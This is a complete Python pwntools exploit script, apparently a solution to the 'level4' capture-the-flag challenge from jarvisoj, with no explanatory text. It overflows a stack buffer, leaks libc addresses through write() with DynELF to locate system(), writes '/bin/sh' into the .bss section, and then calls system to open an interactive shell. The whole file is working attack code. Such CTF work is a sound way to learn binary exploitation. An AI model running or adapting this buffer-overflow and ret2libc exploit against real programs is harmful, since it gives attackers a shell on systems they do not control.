#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
#context.log_level = 'debug' 
io = process('./level4')
#io = remote('pwn2.jarvisoj.com', 9880) 
elf = ELF('./level4')
write_elf_addr = elf.plt['write']
start_elf_addr = elf.symbols['main']
read_elf_addr = elf.plt['read']
bss_addr = elf.bss() 
def leak(addr):
	payload = 'A' * (0x88 + 0x4) + p32(write_elf_addr) + p32(start_elf_addr) + p32(0x1) + p32(addr) + p32(0x4) 
	io.send(payload)
	leaked = io.recv(4)
	#log.info("leaked -> %s -> 0x%x" % (leaked, u32(leaked)))
	return leaked

d = DynELF(leak, elf = ELF('./level4'))
sys_addr = d.lookup('system', 'libc')
log.info("sys_addr -> 0x%x" % sys_addr) 
payload = 'A' * (0x88 + 0x4) + p32(read_elf_addr) + p32(start_elf_addr) + p32(0x0) + p32(bss_addr) + p32(0x8) 
io.send(payload)
io.send('/bin/sh\0') 
print "the bss_addr %s" % bss_addr
print "the sys_addr %x" % sys_addr
sh_addr = bss_addr
payload = 'A' * (0x88 + 0x4) + p32(sys_addr) + p32(0xdeadbeef) + p32(sh_addr)
io.send(payload)
io.interactive()
io.close()
